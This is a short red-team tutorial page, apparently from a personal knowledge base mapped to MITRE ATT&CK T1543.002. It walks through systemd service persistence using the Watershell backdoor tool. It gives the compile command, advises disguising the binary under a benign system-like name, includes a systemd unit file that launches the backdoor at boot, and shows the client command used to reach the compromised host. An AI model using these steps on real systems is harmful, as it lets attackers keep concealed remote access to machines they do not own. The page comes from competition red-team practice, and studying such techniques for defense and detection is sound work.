---
description: MITRE ATT&CK, Persistence, Sub-technique T1543.002
---

# Systemd Service Persistence

The following example demonstrates Systemd persistence with Watershell.&#x20;

[Watershell ](https://github.com/RITRedteam/watershell-cpp)is an incredible script that I came across from a fellow red teamer during CCDC Regionals. I highly recommend reading the [original GitHub](https://github.com/wumb0/watershell) to learn more about the tool.

General steps for persistence with Watershell:

1. Compile the binary:&#x20;

```bash
g++ main.cpp watershell.cpp -o ${INSERT_BINARY_NAME}
```

2\. Note: You can edit the default port that the binary uses in the main.cpp and watershell.cpp files prior to compiling.

3\. Transfer the binary to the targets system, I recommend naming the binary something inconspicuous such as `networkd` or `ipv6_conf`

4\. Setup a service to execute the binary, the following demonstrates an example configuration:

```bash
[Unit]
Description=persistence

[Service]
Type=simple
ExecStart=/bin/networkd -l $port

[Install]
WantedBy=multi-user.target
```

5\. Connect to the target using `watershell-cli.py` using the following command:

```bash
python3 watershell-cli.py -t $ip -p $port
```

### References

{% embed url="https://redcanary.com/blog/attck-t1501-understanding-systemd-service-persistence" %}
